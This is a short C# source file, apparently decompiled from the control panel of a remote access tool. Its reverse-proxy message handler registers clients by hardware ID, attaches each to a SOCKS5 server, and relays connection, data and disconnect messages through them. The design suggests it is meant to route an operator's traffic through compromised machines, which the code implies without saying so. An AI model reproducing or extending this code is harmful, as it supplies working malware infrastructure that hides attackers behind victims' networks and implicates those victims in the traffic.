using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper.Sock5;

namespace Server.Messages;

internal class HandlerReverseProxy
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormReverseProxy form = (FormReverseProxy)Application.OpenForms["ReverseProxy:" + (string)objects[2]];
			if (form == null)
			{
				client.Disconnect();
				break;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Reverse Proxy [" + (string)objects[2] + "]";
				form.client = client;
				form.server = new Server.Helper.Sock5.Server(client);
				form.Activea();
				form.GridIps.Enabled = true;
				form.rjButton1.Enabled = true;
				form.rjTextBox1.Enabled = true;
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
			break;
		}
		case "Accept":
		{
			FormReverseProxy formReverseProxy = (FormReverseProxy)Application.OpenForms["ReverseProxy:" + (string)objects[3]];
			if (formReverseProxy == null)
			{
				client.Disconnect();
				break;
			}
			Client client3 = formReverseProxy.server.Search((int)objects[2]);
			client3?.Accept(client);
			client.Tag = client3;
			break;
		}
		case "ConnectResponse":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			Client client2 = (Client)client.Tag;
			client2?.HandleCommandResponse(objects);
			client.Tag = client2;
			break;
		}
		case "Data":
			if (client.Tag == null)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Send((byte[])objects[2]);
			}
			break;
		case "Disconnect":
			if (client.Tag == null)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Disconnect();
			}
			break;
		}
	}
}
